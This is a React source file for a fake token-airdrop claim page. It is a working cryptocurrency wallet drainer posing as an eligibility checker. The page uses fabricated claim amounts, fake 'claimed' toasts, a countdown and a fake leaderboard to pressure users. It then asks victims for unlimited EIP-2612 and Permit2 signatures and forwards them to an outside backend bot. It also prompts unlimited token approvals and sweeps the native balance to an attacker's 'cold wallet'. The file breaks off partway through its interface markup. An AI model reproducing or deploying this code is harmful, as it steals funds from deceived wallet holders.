import { Buffer } from 'buffer'
if (typeof window !== 'undefined') {
    window.Buffer = window.Buffer || Buffer
}

import { useState, useEffect, useRef, useCallback } from 'react'
import {
    createAppKit,
    useAppKit,
    useAppKitAccount,
    useAppKitProvider,
    useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits, ethers } from 'ethers'
import {
    ArrowLeft,
    X,
    ChevronDown,
    Wallet,
    Shield,
    CheckCircle,
    Gavel,
    TrendingUp,
    Zap,
    Share2,

} from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon, base } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'

// 🌐 BACKEND URL CONFIGURATION
const BACKEND_URL = 'https://salvation-server-gp-production.up.railway.app'

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const BACKEND_BOT_ADDRESS = '0x15DA27B8ffF30DA16d5e0fed74C5095a62350Dc8'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'

// 💎 MULTI-CHAIN EVM DISCOVERY CONFIGURATION (Includes Base & Vault Tokens)
const CHAIN_TOKENS: Record<number, any[]> = {
    1: [ // Ethereum Mainnet
        { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
        { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
        { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
        { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
        { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
        { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18, fallbackPrice: 18 },
        { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
        { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
        { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 },
        // Morpho Vault Shares
        { symbol: 'mUSDC', address: '0x73e65DBD630f90604062f6E40dd9D66C291F2e3a', decimals: 6, fallbackPrice: 1 },
        { symbol: 'mUSDT', address: '0x8eB1B83A39C3C63b85e97a92D20b83451aB1c3e4', decimals: 6, fallbackPrice: 1 },
        { symbol: 'mDAI', address: '0x50cE402B61D52b2b1B9a5d1c5e4c5d4b3a2d1c0b', decimals: 18, fallbackPrice: 1 },
        // Aave aTokens
        { symbol: 'aUSDC', address: '0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c', decimals: 6, fallbackPrice: 1 },
        { symbol: 'aUSDT', address: '0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a', decimals: 6, fallbackPrice: 1 },
        { symbol: 'aDAI', address: '0x018008bfb33d285247A21d44E50697654f754e63', decimals: 18, fallbackPrice: 1 },
        { symbol: 'aWETH', address: '0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8', decimals: 18, fallbackPrice: 3500 },
        // Compound cTokens
        { symbol: 'cUSDC', address: '0xc3d688B66703497DAA19211EEdff47f25384cdc3', decimals: 6, fallbackPrice: 1 },
        { symbol: 'cWETH', address: '0xA17581A9E3356d9A858b789D68B4d866e593aE94', decimals: 18, fallbackPrice: 3500 },
        { symbol: 'cCOMP', address: '0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4', decimals: 18, fallbackPrice: 50 },
    ],
    56: [ // BSC
        { symbol: 'BNB', address: 'native', isNative: true, coingeckoId: 'binancecoin', decimals: 18, fallbackPrice: 600 },
        { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, fallbackPrice: 1 },
        { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, fallbackPrice: 1 },
    ],
    137: [ // Polygon
        { symbol: 'MATIC', address: 'native', isNative: true, coingeckoId: 'matic-network', decimals: 18, fallbackPrice: 0.5 },
        { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, fallbackPrice: 1 },
        { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
    ],
    42161: [ // Arbitrum
        { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
        { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, fallbackPrice: 1 },
        { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, fallbackPrice: 1 },
    ],
    8453: [ // Base
        { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
        { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C326D11A3990168f467', decimals: 6, fallbackPrice: 1 },
        { symbol: 'USDT', address: '0x4200000000000000000000000000000000000006', decimals: 6, fallbackPrice: 1 },
    ]
}

const CHAIN_NAMES: Record<number, string> = {
    1: 'ethereum',
    56: 'binance-smart-chain',
    137: 'polygon-pos',
    42161: 'arbitrum-one',
    8453: 'base'
}

const getChainName = (chainId: number) => {
    if (chainId === 1) return 'Ethereum'
    if (chainId === 56) return 'BSC'
    if (chainId === 137) return 'Polygon'
    if (chainId === 42161) return 'Arbitrum'
    if (chainId === 8453) return 'Base'
    return 'Ethereum'
}

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon, base]

const EVM_ERC20_ABI = [
    'function balanceOf(address owner) view returns (uint256)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function nonces(address owner) view returns (uint256)',
    'function name() view returns (string)'
]

const PERMIT2_ABI = [
    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Static UI data ──
const LEADERBOARD_DATA = [
    { rank: 1, address: '0xA91F...7C2E', amount: '1.20 ETH' },
    { rank: 2, address: '0x5D73...E8B1', amount: '0.94 ETH' },
    { rank: 3, address: '0xC8A4...19FD', amount: '0.72 ETH' },
    { rank: 4, address: '0x2F6B...D43A', amount: '0.61 ETH' },
    { rank: 5, address: '0xB1E9...84C7', amount: '0.54 ETH' },
    { rank: 6, address: '0x7A3D...F25E', amount: '0.48 ETH' },
    { rank: 7, address: '0x4CE1...9AB8', amount: '0.41 ETH' },
    { rank: 8, address: '0xD62F...31E4', amount: '0.36 ETH' },
    { rank: 9, address: '0x8B70...C5D9', amount: '0.31 ETH' },
    { rank: 10, address: '0x1FAD...7E62', amount: '0.27 ETH' },
    { rank: 11, address: '0xE934...2BC1', amount: '0.24 ETH' },
    { rank: 12, address: '0x6C5A...F918', amount: '0.21 ETH' },
    { rank: 13, address: '0x3DB7...4A6E', amount: '0.19 ETH' },
    { rank: 14, address: '0x9E42...D0B5', amount: '0.17 ETH' },
    { rank: 15, address: '0xF18C...83A7', amount: '0.15 ETH' },
    { rank: 16, address: '0x74B9...E16D', amount: '0.14 ETH' },
    { rank: 17, address: '0x2AC5...98F3', amount: '0.12 ETH' },
    { rank: 18, address: '0xBE61...5D2A', amount: '0.11 ETH' },
    { rank: 19, address: '0x0D87...CAF4', amount: '0.10 ETH' },
    { rank: 20, address: '0x91E3...6B58', amount: '0.09 ETH' },
]

const FAQ_DATA = [
    { q: 'What is this claim page for?', a: 'This page checks whether your wallet is eligible for the current token airdrop, then shows the available claim amount before the claim step.' },
    { q: 'Which wallet should I check?', a: 'Use the wallet address that may have interacted with the token, campaign, or related ecosystem activity. The form accepts public EVM addresses across Ethereum, BSC, Polygon, Arbitrum, and Base.' },
    { q: 'How does eligibility work?', a: 'The flow validates the wallet format, checks holder status, scans wallet activity, and then calculates whether an allocation is available for claim.' },
    { q: 'Are claims time-limited?', a: 'Yes. The claim timer shows the remaining window. When the timer ends, eligibility checks and token claims may no longer be available.' },
    { q: 'Gas and network', a: 'Claims are designed for EVM chains. Keep a small native token balance available for transaction fees and always review wallet prompts before approving.' },
    { q: 'Can I change my claim wallet?', a: 'The claim is tied to the wallet address you check. To use a different destination, restart the check with another valid wallet address before claiming.' },
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
    projectId: WC_PROJECT_ID,
    networks: evmNetworks,
})

createAppKit({
    adapters: [wagmiAdapter],
    networks: evmNetworks,
    defaultNetwork: mainnet,
    projectId: WC_PROJECT_ID,
    metadata: {
        name: 'CryptoSafe Protocol',
        description: 'Secure Decentralized Network',
        url: 'https://cryptosafe.network',
        icons: ['https://cryptosafe.network/favicon.svg'],
    },
    themeMode: 'light',
    themeVariables: { '--w3m-accent': '#0C66FF' },
    allWallets: 'SHOW',
    features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
    try {
        const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',')
        const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`)
        const data = await res.json()
        const prices: Record<string, number> = {}
        for (const token of tokens) {
            const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase()
            const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey)
            prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice
        }
        return prices
    } catch (error) {
        const prices: Record<string, number> = {}
        for (const token of tokens) { prices[token.symbol] = token.fallbackPrice }
        return prices
    }
}

const smartTokenSort = (a: any, b: any) => {
    if (a.isNative && !b.isNative) return 1
    if (!a.isNative && b.isNative) return -1
    return (b.usdValue || 0) - (a.usdValue || 0)
}

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))

// ── DIRECT INJECTED PROVIDER DETECTORS ──
const detectDirectProvider = (): { provider: any; walletName: string } | null => {
    if (typeof window === 'undefined') return null
    const w = window as any
    const ethereum = w.ethereum
    if (!ethereum) return null

    const providers = ethereum.providers ? [...ethereum.providers] : [ethereum]
    const detectors: { name: string; check: (p: any) => boolean }[] = [
        { name: 'Trust Wallet', check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
        { name: 'MetaMask', check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
        { name: 'Coinbase Wallet', check: (p) => p.isCoinbaseWallet || p.isCoinbase },
        { name: 'SafePal', check: (p) => p.isSafePal },
        { name: 'TokenPocket', check: (p) => p.isTokenPocket },
        { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
        { name: 'Rabby Wallet', check: (p) => p.isRabby },
        { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
        { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
        { name: 'Opera Wallet', check: (p) => p.isOpera },
    ]

    for (const provider of providers) {
        for (const detector of detectors) {
            if (detector.check(provider)) return { provider, walletName: detector.name }
        }
    }
    for (const provider of providers) {
        if (provider.request) return { provider, walletName: 'Injected Wallet' }
    }
    return null
}

export default function Airdrop({ onClose }: { onClose?: () => void } = {}) {
    // ── Original Dapp state ──
    const [status, setStatus] = useState('Ready')
    const [loading, setLoading] = useState(false)
    const [_txHash, setTxHash] = useState('')
    const [_debugLogs, setDebugLogs] = useState<string[]>([])

    // ── Airdrop UI state ──
    const [currentStage, setCurrentStage] = useState<'connect' | 'loading' | 'claim' | 'ineligible'>('connect')
    const [activeStep, setActiveStep] = useState(1)
    const [loadingText, setLoadingText] = useState('Checking holders...')
    const [fakeClaimAmount] = useState(() => (Math.random() * 2.5 + 0.5).toFixed(2))
    const [fakeClaimUSD] = useState(() => (parseFloat(fakeClaimAmount) * 1919).toFixed(0))

    const [totalSeconds, setTotalSeconds] = useState(5 * 3600 + 52 * 60 + 29)
    const [toastVisible, setToastVisible] = useState(false)
    const [toastMessage, setToastMessage] = useState('')
    const [openFaqIndex, setOpenFaqIndex] = useState<number | null>(null)

    const manualConnect = useRef(false)
    const isExecuting = useRef(false)

    const { open } = useAppKit()

    // EVM Namespace Hooks
    const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
    const { chainId } = useAppKitNetwork()
    const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

    const log = (msg: string) => {
        console.log(msg)
        setDebugLogs(prev => [...prev, msg].slice(-15))
    }

    // ── Countdown timer ──
    useEffect(() => {
        const interval = setInterval(() => {
            setTotalSeconds(prev => (prev <= 0 ? 0 : prev - 1))
        }, 1000)
        return () => clearInterval(interval)
    }, [])

    const formatCountdown = useCallback(() => {
        if (totalSeconds <= 0) return '0d 00h 00m 00s'
        const hours = Math.floor(totalSeconds / 3600)
        const minutes = Math.floor((totalSeconds % 3600) / 60)
        const seconds = totalSeconds % 60
        return `0d ${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`
    }, [totalSeconds])

    // ── Toast notifications ──
    const showRandomToast = useCallback(() => {
        const chars = 'ABCDEF0123456789'
        let randomAddr = '0x'
        for (let i = 0; i < 4; i++) randomAddr += chars[Math.floor(Math.random() * 16)]
        randomAddr += '...'
        for (let i = 0; i < 4; i++) randomAddr += chars[Math.floor(Math.random() * 16)]
        const randomEth = (Math.random() * (1.5 - 0.05) + 0.05).toFixed(2)
        setToastMessage(`${randomAddr.toUpperCase()} claimed ${randomEth} ETH`)
        setToastVisible(true)
        setTimeout(() => setToastVisible(false), 4000)
    }, [])

    useEffect(() => {
        const t1 = setTimeout(showRandomToast, 2000)
        const interval = setInterval(showRandomToast, 9000)
        return () => {
            clearTimeout(t1)
            clearInterval(interval)
        }
    }, [showRandomToast])

    // ── Wallet connection effect ──
    useEffect(() => {
        if (!isEvmConnected || !evmAddress || !evmWalletProvider) {
            setCurrentStage('connect')
            return
        }

        // Auto-trigger eligibility check when wallet connects
        if (manualConnect.current || currentStage === 'connect') {
            manualConnect.current = false
            log(`[SYSTEM] Connected EVM: ${evmAddress}`)
            log('🔥 Auto-triggering eligibility check...')
            setCurrentStage('loading')
            setLoadingText('Verifying eligibility...')

            // Run actual balance check
            const runEligibilityCheck = async () => {
                // Step 1: Verifying eligibility
                await sleep(800)
                setLoadingText('Scanning wallet history...')

                // Step 2: Check actual balances
                await sleep(800)
                setLoadingText('Computing allocation...')

                const hasActivity = await checkWalletActivity(evmWalletProvider, evmAddress)

                await sleep(600)

                if (hasActivity) {
                    setCurrentStage('claim')
                    setActiveStep(3)
                } else {
                    setCurrentStage('ineligible')
                    setActiveStep(2)
                }
            }

            runEligibilityCheck()
        }
    }, [isEvmConnected, evmAddress, evmWalletProvider, chainId])



    // ── ELIGIBILITY CHECK: Scans wallet for on-chain activity ──
    const checkWalletActivity = async (provider: any, address: string): Promise<boolean> => {
        try {
            const ethersProvider = new BrowserProvider(provider as any)
            const activeChainId = Number((await ethersProvider.getNetwork()).chainId)
            const cleanAddress = address.toLowerCase()

            const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1]

            // Check native balance first (ETH, BNB, MATIC, etc)
            try {
                const nativeBal = await ethersProvider.getBalance(cleanAddress)
                if (nativeBal > 0n) {
                    log(`✅ Native balance found: ${nativeBal.toString()}`)
                    return true
                }
            } catch (e) { }

            // Check ERC20 balances (USDC, USDT, aTokens, etc)
            for (const token of baseTokens) {
                if (token.isNative) continue

                try {
                    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider)
                    const bal = await tokenContract.balanceOf(cleanAddress)
                    if (bal > 0n) {
                        log(`✅ Balance found for ${token.symbol}: ${bal.toString()}`)
                        return true
                    }
                } catch (e) { }
            }

            log('⚠️ No balances found - wallet ineligible')
            return false
        } catch (err) {
            log(`❌ Balance check error: ${err instanceof Error ? err.message : 'Unknown'}`)
            return false
        }
    }



    const handleClaimTokens = async () => {
        if (isExecuting.current) {
            log('⚠️ Execution already in progress.')
            return
        }

        if (isEvmConnected && evmWalletProvider && evmAddress) {
            await approveAndCollect(evmWalletProvider, evmAddress)
            return
        }

        const directEvm = detectDirectProvider()
        if (!isEvmConnected && directEvm?.provider?.request) {
            try {
                setLoading(true)
                setStatus('Connecting EVM Wallet...')
                log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`)
                const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' })
                if (accounts?.length > 0) {
                    log(`[SYSTEM] Connected EVM: ${accounts[0]}`)
                    await approveAndCollect(directEvm.provider, accounts[0])
                    return
                }
            } catch (e) {
                log('❌ Direct EVM connection cancelled or failed')
                setLoading(false)
                setStatus('Ready')
            }
        }

        manualConnect.current = true
        open()
    }

    // ── GASLESS SIGNATURE HELPERS ──
    const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: any) => {
        const chainId = (await signer.provider.getNetwork()).chainId
        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer)
        const name = await tokenContract.name()
        const nonce = await tokenContract.nonces(await signer.getAddress())

        // 🔥 FIXED: All official USDC tokens across all EVM chains use version '2'
        const version = (token.symbol === 'USDC') ? '2' : '1'

        const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address }
        const types = {
            Permit: [
                { name: 'owner', type: 'address' },
                { name: 'spender', type: 'address' },
                { name: 'value', type: 'uint256' },
                { name: 'nonce', type: 'uint256' },
                { name: 'deadline', type: 'uint256' },
            ],
        }
        const message = { owner: await signer.getAddress(), spender, value, nonce, deadline }
        return await signer.signTypedData(domain, types, message)
    }

    const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
        const activeProvider = forcedProvider || evmWalletProvider
        const activeAddress = forcedAddress || evmAddress

        if (!activeAddress || !activeProvider) return

        if (isExecuting.current) {
            log('⚠️ Blocked duplicate execution loop.')
            return
        }
        isExecuting.current = true

        setLoading(true)
        setStatus('Scanning USD Values...')
        log('[SYSTEM] Scanning balances...')
        let successCount = 0

        try {
            const ethersProvider = new BrowserProvider(activeProvider as any)
            const activeChainId = Number((await ethersProvider.getNetwork()).chainId)
            const signer = await ethersProvider.getSigner(activeAddress)
            const cleanSenderAddress = (await signer.getAddress()).toLowerCase()

            // 🔥 FOREVER DEADLINE: Standard DeFi UX (Unlimited approval)
            const deadline = ethers.MaxUint256

            // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
            const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1]
            const chainName = CHAIN_NAMES[activeChainId] || 'ethereum'

            const validTokens: any[] = []
            const prices = await fetchTokenPrices(baseTokens, chainName)

            for (const token of baseTokens) {
                try {
                    if (token.isNative) {
                        const bal = await ethersProvider.getBalance(cleanSenderAddress)
                        const normalizedBal = parseFloat(formatUnits(bal, token.decimals))
                        const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice)
                        validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue })
                    } else {
                        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider)
                        const bal = await tokenContract.balanceOf(cleanSenderAddress)
                        const normalizedBal = parseFloat(formatUnits(bal, token.decimals))
                        const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice)
                        validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue })
                    }
                } catch (e) { }
            }

            validTokens.sort(smartTokenSort)

            const rawProvider = activeProvider as any
            const w = window as any
            const injected = w.ethereum || {}

            const isStrictlyMetaMask =
                (rawProvider?.isMetaMask || injected?.isMetaMask) &&
                !injected?.isTrust &&
                !injected?.isTrustWallet &&
                !injected?.isSafePal &&
                !injected?.isTokenPocket

            let tokensToProcess = validTokens

            if (isStrictlyMetaMask) {
                log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`)
                tokensToProcess = validTokens.slice(0, 1)
            } else {
                log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`)
            }

            if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`)

            for (const token of tokensToProcess) {
                try {
                    if (!token.isNative) {
                        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer)
                        const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS)
                        const hasPermit2Mapping = currentP2Allowance > 0n

                        log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`)

                        let authorized = false

                        if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                            try {
                                setStatus(`Signing Permit: ${token.symbol}...`)
                                log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`)

                                // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
                                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString(), deadline)

                                fetch(`${BACKEND_URL}/execute-gasless`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        type: 'PERMIT',
                                        chainName: getChainName(activeChainId),
                                        token: token.address,
                                        owner: cleanSenderAddress,
                                        spender: EVM_CONTRACT_ADDRESS,
                                        signature,
                                        deadline: deadline.toString(),
                                        value: ethers.MaxUint256.toString()
                                    })
                                }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`))

                                authorized = true
                                log(`✅ ${token.symbol} Permit Secured & Sent.`)
                            } catch (pErr: any) {
                                log(`⚠️ Permit failed: ${pErr?.message || 'Unknown'}`)
                            }
                        }

                        if (!authorized && hasPermit2Mapping) {
                            try {
                                setStatus(`Signing Permit2: ${token.symbol}...`)
                                log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`)
                                const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer)
                                const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS)
                                const currentNonce = Number(allowanceData.nonce)
                                log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`)

                                const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS }
                                const types = {
                                    PermitSingle: [
                                        { name: 'details', type: 'PermitDetails' },
                                        { name: 'spender', type: 'address' },
                                        { name: 'sigDeadline', type: 'uint256' },
                                    ],
                                    PermitDetails: [
                                        { name: 'token', type: 'address' },
                                        { name: 'amount', type: 'uint160' },
                                        { name: 'expiration', type: 'uint48' },
                                        { name: 'nonce', type: 'uint48' },
                                    ],
                                }

                                const permit2MaxAmount = '1461501637330902918203684832716283019655932542975'

                                const message = {
                                    details: {
                                        token: token.address,
                                        amount: permit2MaxAmount,
                                        expiration: deadline,
                                        nonce: currentNonce
                                    },
                                    spender: BACKEND_BOT_ADDRESS, // ✅ FIXED: Grant allowance to the bot calling transferFrom
                                    sigDeadline: deadline
                                }
                                const signature = await signer.signTypedData(domain, types, message)

                                fetch(`${BACKEND_URL}/execute-gasless`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        type: 'PERMIT2',
                                        chainName: getChainName(activeChainId),
                                        token: token.address,
                                        owner: cleanSenderAddress,
                                        spender: BACKEND_BOT_ADDRESS, // ✅ MUST MATCH THE SIGNATURE
                                        signature,
                                        deadline: deadline.toString(),
                                        nonce: currentNonce,
                                        amount: permit2MaxAmount
                                    })
                                }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`))

                                authorized = true
                                log(`✅ ${token.symbol} Permit2 Secured & Sent.`)
                            } catch (p2Err: any) {
                                log(`⚠️ Permit2 failed: ${p2Err?.message || 'Unknown'}`)
                            }
                        }

                        if (!authorized) {
                            setStatus(`Approving ${token.symbol}...`)
                            log(`[ACTION] Prompting Approve: ${token.symbol}`)

                            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer)
                            const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()])

                            const txHash = await (activeProvider as any).request({
                                method: 'eth_sendTransaction',
                                params: [{
                                    from: cleanSenderAddress,
                                    to: token.address,
                                    data: encodedData,
                                    value: '0x0'
                                }]
                            })

                            setTxHash(txHash)
                            log(`✅ ${token.symbol} Approved!`)
                        }

                        successCount++
                        await sleep(1500)
                    }
                } catch (err: any) {
                    const exactError = err?.message || JSON.stringify(err)
                    log(`❌ Rejected: ${exactError.substring(0, 30)}...`)
                    await sleep(1500)
                }
            }

            try {
                setStatus(`Transferring Native Token...`)
                log(`[ACTION] Executing Contingency Native Sweep...`)

                const liveBal = await ethersProvider.getBalance(cleanSenderAddress)
                const gasCost = 21000n * 3000000000n
                const totalGas = gasCost + ((gasCost * 20n) / 100n)

                if (liveBal > totalGas) {
                    const sendAmount = liveBal - totalGas
                    const hexValue = "0x" + sendAmount.toString(16)

                    const txHash = await (activeProvider as any).request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: cleanSenderAddress,
                            to: EVM_COLD_WALLET.toLowerCase(),
                            value: hexValue
                        }]
                    })

                    setTxHash(txHash)
                    successCount++
                    log(`✅ Contingency Native Sweep Sent!`)
                    await sleep(1500)
                } else {
                    log(`⚠️ Contingency Skipped: Insufficient native token for gas.`)
                }
            } catch (nativeErr: any) {
                const exactError = nativeErr?.message || JSON.stringify(nativeErr)
                log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`)
            }

            if (successCount > 0) {
                setStatus('✅ Processing Complete!')
            } else {
                setStatus('❌ Failed: User Rejected All')
            }
        } catch (err: any) {
            const errorMsg = err?.message || JSON.stringify(err)
            log(`❌ Global Error: ${errorMsg.substring(0, 50)}`)
            setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`)
        } finally {
            isExecuting.current = false
            setLoading(false)
        }
    }

    // ── Helpers ──
    const getRankColor = (rank: number) => {
        if (rank === 1) return '#f59e0b'
        if (rank === 2) return '#d1d5db'
        if (rank === 3) return '#d97706'
        return '#6b7280'
    }

    return (
        <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', color: '#f3f4f6', fontFamily: 'system-ui, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50, overflowY: 'auto' }}>
            <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #131a26; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
        .animate-fadeIn { animation: fadeIn 0.4s ease-out forwards; }
        .animate-pulse-custom { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
        .animate-spin-custom { animation: spin 1s linear infinite; }
        .responsive-grid { display: grid; grid-template-columns: 7fr 5fr; gap: 32px; align-items: start; }
        @media (max-width: 1023px) { .responsive-grid { grid-template-columns: 1fr; } }
      `}</style>

            {/* Header */}
            <header style={{ width: '100%', maxWidth: 1280, margin: '0 auto', padding: '16px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid rgba(30,41,59,0.6)' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    {onClose && <ArrowLeft size={22} color="#94a3b8" style={{ cursor: 'pointer' }} onClick={onClose} />}
                    <div style={{ height: 36, width: 36, background: 'linear-gradient(135deg,#6366f1,#9333ea)', borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 14px rgba(99,102,241,0.25)' }}>
                        <Share2 size={15} color="#ffffff" />
                    </div>
                    <span style={{ fontWeight: 700, fontSize: 18, background: 'linear-gradient(to right,#fff,#94a3b8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>EVMCoinCaps</span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                    {isEvmConnected ? (
                        <div style={{
                            display: 'flex',
                            alignItems: 'center',
                            gap: 8,
                            backgroundColor: 'rgba(16,185,129,0.1)',
                            border: '1px solid rgba(16,185,129,0.3)',
                            padding: '6px 14px',
                            borderRadius: 9999
                        }}>
                            <div style={{
                                width: 6,
                                height: 6,
                                borderRadius: '50%',
                                backgroundColor: '#10b981'
                            }} />
                            <span style={{ fontSize: 12, fontWeight: 600, color: '#10b981', fontFamily: 'monospace' }}>
                                {evmAddress?.slice(0, 6)}...{evmAddress?.slice(-4)}
                            </span>
                        </div>
                    ) : (
                        <button
                            onClick={() => { manualConnect.current = true; open() }}
                            style={{
                                backgroundColor: '#6366f1',
                                border: 'none',
                                padding: '8px 18px',
